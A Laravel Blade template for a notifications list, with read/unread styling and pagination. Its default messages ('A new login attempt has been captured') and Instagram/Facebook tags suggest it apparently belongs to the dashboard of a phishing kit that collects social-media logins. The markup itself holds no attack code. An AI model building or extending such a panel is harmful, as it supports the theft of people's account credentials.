<div class="bg-white shadow-sm rounded-xl border border-gray-200">
    <div class="divide-y divide-gray-200">
        @forelse($notifications as $notification)
            <div data-notification-id="{{ $notification->id }}" class="p-6 {{ $notification->read_at ? 'bg-white' : 'bg-blue-50' }} hover:bg-gray-50 transition-colors cursor-pointer" onclick="markAsRead('{{ $notification->id }}')">
                <div class="flex items-start space-x-4">
                    <div class="flex-shrink-0">
                        <div class="w-10 h-10 bg-gradient-to-br from-red-400 to-red-600 rounded-full flex items-center justify-center">
                            <i class="fas fa-shield-alt text-white"></i>
                        </div>
                    </div>
                    <div class="flex-1 min-w-0">
                        <div class="flex items-center justify-between">
                            <p class="text-sm font-medium text-gray-900">
                                {{ $notification->data['title'] ?? 'New Login Attempt' }}
                            </p>
                            <div class="flex items-center space-x-2">
                                @if(!$notification->read_at)
                                    <span class="w-2 h-2 bg-blue-500 rounded-full"></span>
                                @endif
                                <span class="text-xs text-gray-500">
                                    {{ $notification->created_at->diffForHumans() }}
                                </span>
                            </div>
                        </div>
                        <p class="text-sm text-gray-600 mt-1">
                            {{ $notification->data['body'] ?? 'A new login attempt has been captured' }}
                        </p>
                        @if(isset($notification->data['platform']))
                            <div class="flex items-center mt-2">
                                @if($notification->data['platform'] === 'instagram')
                                    <i class="fab fa-instagram text-pink-600 mr-2"></i>
                                    <span class="text-xs text-gray-500">Instagram</span>
                                @else
                                    <i class="fab fa-facebook text-blue-600 mr-2"></i>
                                    <span class="text-xs text-gray-500">Facebook</span>
                                @endif
                            </div>
                        @endif
                    </div>
                </div>
            </div>
        @empty
            <div class="p-12 text-center">
                <i class="fas fa-bell-slash text-4xl text-gray-300 mb-4"></i>
                <h3 class="text-lg font-medium text-gray-900 mb-2">No notifications</h3>
                <p class="text-gray-500">You're all caught up! New notifications will appear here.</p>
            </div>
        @endforelse
    </div>
    
    @if($notifications->hasPages())
        <div class="px-6 py-4 border-t border-gray-200 bg-gray-50 rounded-b-xl">
            {{ $notifications->links() }}
        </div>
    @endif
</div>